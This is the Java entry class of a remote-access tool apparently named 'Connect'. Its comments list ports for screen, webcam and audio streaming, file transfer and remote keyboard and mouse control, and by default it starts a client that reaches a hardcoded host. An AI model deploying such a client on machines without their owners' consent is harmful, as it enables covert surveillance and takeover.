package br.com.introcdc.connect;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 16:29
 */

import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.components.FileComponents;
import br.com.introcdc.connect.server.ConnectServer;

public class Connect {

    /*
    Portas:
        PORT: Porta principal, transmissão de texto
        PORT + 1: Transmissão de tela (estática ou streaming)
        PORT + 2: Transmissão de webcam (estática ou streaming)
        PORT + 3: Transmissão de arquivos (cliente para servidor)
        PORT + 4: Transmissão de arquivos (servidor para cliente)
        PORT + 5: Transmissão de imagem (visualização de imagem)
        PORT + 6: Transmissão do control remoto (controle de teclado e mouse)
        PORT + 7: Transmissão de áudio (cliente para servidor)
        PORT + 8: Transmissão de áudio (servidor para cliente)
        PORT + 9: Transmissão de tela e webcam para ícone
     */
    public static String IP = "local.introcdc.com";
    public static final int PORT = 12345;

    public static void main(String[] args) {
        if (args.length == 1) {
            IP = args[0];
        }
        if (!FileComponents.getFileName().equalsIgnoreCase("ConnectServer.jar")) {
            ConnectClient.startClient();
        } else {
            ConnectServer.startServer();
        }
    }

}
